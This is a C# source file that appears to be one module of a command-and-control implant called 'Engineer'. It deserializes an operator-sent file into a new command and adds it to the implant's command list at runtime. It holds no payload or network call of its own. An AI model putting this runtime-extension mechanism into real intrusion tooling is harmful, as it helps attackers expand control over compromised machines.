using System;
using System.Reflection;
using System.Threading.Tasks;
using Engineer.Functions;
using Engineer.Models;

namespace Engineer.Commands;

public class AddCommand : EngineerCommand
{
    public override string Name => "AddCommand";
    public override async Task Execute(EngineerTask task)
    {
        try
        {
            //task.file and deseralize it to a EngineerCommand object then add it to the Program._Commands list
            if(task.File == null)
            {
                Tasking.FillTaskResults("Error: /command argument contains no data, please specify a valid command ",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
            }
            else
            if(task.File.Length < 1)
            {
                Tasking.FillTaskResults("Error: /command argument contains no data, please specify a valid command ",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
            }
            else
            {
                var newCommand = task.File.ProDeserialize<EngineerCommand>();
                Program._commands.Add(newCommand);
                Tasking.FillTaskResults($"Command {newCommand.Name} added successfully",task,EngTaskStatus.Complete,TaskResponseType.String);
            }

        }
        catch (Exception e)
        {
            Console.WriteLine(e.Message);
        }
    }
}